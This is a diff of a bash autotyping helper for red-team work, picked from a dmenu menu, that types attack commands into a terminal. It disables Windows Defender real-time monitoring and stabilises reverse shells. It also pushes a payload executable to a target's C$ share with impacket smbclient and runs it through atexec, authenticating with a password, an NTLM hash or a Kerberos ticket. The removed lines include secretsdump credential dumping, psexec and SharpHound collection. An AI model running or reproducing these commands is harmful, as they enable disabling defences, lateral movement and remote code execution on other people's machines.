@@ -26,15 +26,21 @@ function ctrl() {
 	xte "keydown Control_L" "key $1" "keyup Control_L"
 }
 
-function_meta=("bye_bye_defender" "Stabilise_reverse_shell" "Stabilise_reverse_shell3" \
-	"vim_hexdump_ascii" "vim_hexdump_binary" "meterpreter_proxychain" \
+function_meta=("bye_bye_defender" "stabilise_rev_shell" "stabilise_rev_shell3" \
 	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
-	"powershell_find_txt" "powershell_find_ps1" "sharphound_exe_collect" "at_exec_ma_boy" "psexec_outa_here" \
-	"secdump_over_the_air" "file_splitter" "add_ssh_keyz")
+	"powershell_find" "at_exec_ma_boy" "file_splitter" "add_ssh_keyz")
 
 # function that are needed
-function stabilize_rev_shell() {
+function stabilise_rev_shell() {
 	command "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	ctrl Z
+	command "stty raw -echo"
+	command "fg"
+	command "export TERM=xterm"
+}
+
+function stabilise_rev_shell3() {
+	command "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
 	ctrl Z
 	command "stty raw -echo"
 	command "fg"
@@ -64,44 +70,13 @@ function tmux_sinc_panes_off() {
 	command "setw synchronize-panes off"
 }
 
-function stabilize_rev_shell3() {
-	command "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
-	ctrl Z
-	command "stty raw -echo"
-	command "fg"
-	command "export TERM=xterm"
-}
-
-function vim_hexdump_to_ascii() {
-	xte "key Escape"
-	command ":%!xxd"
-}
-
-function vim_hexdump_to_binary() {
-	xte "key Escape"
-	command ":%!xxd -r"
-}
-
 function bye_bye_defender() {
 	command "Set-MpPreference -DisableRealtimeMonitoring \$true"
 }
 
-function meterpreter_proxychain() {
-	command "background"
-	command "use auxiliary/server/socks4a"
-	command "use post/mult/manage/autoroute"
-}
-
-function powershell_find_txt() {
+function powershell_find() {
 	key "Get-ChildItem -Path . -Filter *.txt -Recurse"
-}
-
-function powershell_find_ps1() {
 	key "Get-ChildItem -Path . -Filter *.ps1 -Recurse"
-}
-
-function sharphound_exe_collect() {
-	key "./SharpHound.exe -c All -s --outputdirectory collect --zipfilename log.zip"
 }
 
 function backdoor_win() {
@@ -117,65 +92,33 @@ function at_exec_ma_boy() {
 	--text="Enter the following information:" \
 	--add-entry="IP Address" \
 	--add-entry="Username" \
-	--add-combo="Authentication Type" --combo-values="Password|Hash" \
+	--add-combo="Authentication Type" --combo-values="Password|Hash|Ticket" \
 	--separator="|")
 	ip_address=$(echo "$form_data" | cut -d"|" -f1)
 	username=$(echo "$form_data" | cut -d"|" -f2)
 	auth_type=$(echo "$form_data" | cut -d"|" -f3)
 
-	password=$(zenity --password --title="enter $auth_type")
-
-	sleep 2
-	if [ $auth_type = "Hash" ]; then
-		command "echo -e \"use C\\$\nput $HOME/payload/demon.x64.exe\" | smbclient.py -debug -hashes $password '$username@$ip_address'"
-		sleep 1
-		command "atexec.py -debug -hashes $password '${username}@$ip_address' 'c:\\demon.x64.exe'"
+	if [ $auth_type = "Ticket" ]; then
+		password=$(zenity --file-selection --title="Select ticket (.ccache)" --file-filter="Kerberos tickets | *.ccache")
 	else
-		command "echo -e \"use C\\$\nput $HOME/payload/demon.x64.exe\" | smbclient.py -debug -hashes '${username}:${password}@$ip_address'"
-		sleep 1
-		command "atexec.py -debug '${username}:${password}@$ip_address' 'c:\\demon.x64.exe'"
+		password=$(zenity --password --title="enter $auth_type")
 	fi
-}
-
-function psexec_outa_here() {
-	form_data=$(zenity --forms --title="Enter Information" \
-	--text="Enter the following information:" \
-	--add-entry="IP Address" \
-	--add-entry="Username" \
-	--add-combo="Authentication Type" --combo-values="Password|Hash" \
-	--separator="|")
-	ip_address=$(echo "$form_data" | cut -d"|" -f1)
-	username=$(echo "$form_data" | cut -d"|" -f2)
-	auth_type=$(echo "$form_data" | cut -d"|" -f3)
-
-	password=$(zenity --password --title="enter $auth_type")
+	agent=$(zenity --file-selection --title="Select executable" --file-filter="Windows executable | *.exe" --filename="$HOME/payload/")
+	exe=$(basename $agent)
 
 	sleep 2
 	if [ $auth_type = "Hash" ]; then
-		command "psexec.py -c $HOME/payload/demon.x64.exe -hashes $password '${username}@$ip_address' './demon.x64.exe'"
+		command "echo -e \"use C\\$\nput $agent\" | /opt/pentest/impacket/bin/smbclient.py -debug -hashes $password '$username@$ip_address'"
+		sleep 1
+		command "/opt/pentest/impacket/bin/atexec.py -debug -hashes $password '${username}@$ip_address' 'c:\\$exe'"
+	elif [ $auth_type = "Ticket" ]; then
+		command "echo -e \"use C\\$\nput $agent\" | KRB5CCNAME=$password /opt/pentest/impacket/bin/smbclient.py -debug -k -no-pass '$username@$ip_address'"
+		sleep 1
+		command "KRB5CCNAME=$password /opt/pentest/impacket/bin/atexec.py -debug -k -no-pass '${username}@$ip_address' 'c:\\$exe'"
 	else
-		command "psexec.py -c $HOME/payload/demon.x64.exe '${username}:${password}@$ip_address' './demon.x64.exe'"
-	fi
-}
-
-function secdump_over_the_air() {
-	form_data=$(zenity --forms --title="Enter Information" \
-	--text="Enter the following information:" \
-	--add-entry="IP Address" \
-	--add-entry="Username" \
-	--add-combo="Authentication Type" --combo-values="Password|Hash" \
-	--separator="|")
-	ip_address=$(echo "$form_data" | cut -d"|" -f1)
-	username=$(echo "$form_data" | cut -d"|" -f2)
-	auth_type=$(echo "$form_data" | cut -d"|" -f3)
-
-	password=$(zenity --password --title="enter $auth_type")
-
-	sleep 2
-	if [ $auth_type = "Hash" ]; then
-		command "secretsdump.py -hashes $password '${username}@$ip_address'"
-	else
-		command "secretsdump.py '${username}:${password}@$ip_address'"
+		command "echo -e \"use C\\$\nput $agent\" | /opt/pentest/impacket/bin/smbclient.py -debug '${username}:${password}@$ip_address'"
+		sleep 1
+		command "/opt/pentest/impacket/bin/atexec.py -debug '${username}:${password}@$ip_address' 'c:\\$exe'"
 	fi
 }
 
@@ -223,46 +166,8 @@ function add_ssh_keyz() {
 
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
 
-
 if [ ! -z $ret ]; then
-	sleep 2
-	if [ $ret = "Stabilise_reverse_shell" ]; then
-		stabilize_rev_shell
-	elif [ $ret = "bye_bye_defender" ]; then
-		bye_bye_defender
-	elif [ $ret = "Stabilise_reverse_shell3" ]; then
-		stabilize_rev_shell3
-	elif [ $ret = "vim_hexdump_ascii" ]; then
-		vim_hexdump_to_ascii
-	elif [ $ret = "vim_hexdump_binary" ]; then
-		vim_hexdump_to_binary
-	elif [ $ret = "meterpreter_proxychain" ]; then
-		meterpreter_proxychain
-	elif [ $ret = "tmux_sinc_panes_on" ]; then
-		tmux_sinc_panes_on
-	elif [ $ret = "tmux_sinc_panes_off" ]; then
-		tmux_sinc_panes_off
-	elif [ $ret = "mimikatz_dump_sam" ]; then
-		mimikatz_dump_sam
-	elif [ $ret = "activate_rdp" ]; then
-		activate_rdp
-	elif [ $ret = "backdoor_win" ]; then
-		backdoor_win
-	elif [ $ret = "powershell_find_txt" ]; then
-		powershell_find_txt
-	elif [ $ret = "powershell_find_ps1" ]; then
-		powershell_find_ps1
-	elif [ $ret = "sharphound_exe_collect" ]; then
-		sharphound_exe_collect
-	elif [ $ret = "at_exec_ma_boy" ]; then
-		at_exec_ma_boy
-	elif [ $ret = "psexec_outa_here" ]; then
-		psexec_outa_here
-	elif [ $ret = "secdump_over_the_air" ]; then
-		secdump_over_the_air
-	elif [ $ret = "file_splitter" ]; then
-		file_splitter
-	elif [ $ret = "add_ssh_keyz" ]; then
-		add_ssh_keyz
-	fi
+	notify-send -a "system" $'You have 5 seconds to wait before the autotype starts...'
+	sleep 5
+	$ret
 fi
